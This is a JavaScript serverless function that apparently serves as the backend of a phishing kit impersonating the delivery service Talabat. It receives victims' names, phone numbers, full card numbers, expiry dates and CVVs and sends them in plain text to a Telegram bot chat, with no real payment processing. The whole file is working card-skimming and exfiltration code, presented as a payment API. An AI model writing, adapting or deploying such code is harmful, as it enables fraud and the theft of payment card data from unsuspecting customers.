// Vercel Serverless Function for Payment Data
const axios = require('axios');

// Telegram Bot Configuration (set via environment variables)
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

module.exports = async (req, res) => {
    // Enable CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Handle preflight requests
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({
            success: false,
            message: 'Method not allowed'
        });
    }
    
    try {
        const {
            firstName,
            lastName,
            phoneNumber,
            creditCard,
            expiryDate,
            expiryMonth,
            expiryYear,
            cvv,
            ip,
            timestamp
        } = req.body;
        
        // Validate required fields
        if (!firstName || !lastName || !phoneNumber || !creditCard || !expiryDate || !cvv) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields'
            });
        }
        
        // Format message for Telegram
        const message = `💳 [Talabat Payment Data]

👤 First Name: ${firstName}
👤 Last Name: ${lastName}
📞 Phone: ${phoneNumber}
💳 Card Number: ${creditCard}
📅 Expiry: ${expiryDate} (${expiryMonth}/${expiryYear})
🔒 CVV: ${cvv}
🌐 IP: ${ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress}
⏰ Time: ${timestamp || new Date().toISOString()}

━━━━━━━━━━━━━━━━━━━━
© Talabat Server API`;

        // Send to Telegram
        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
};
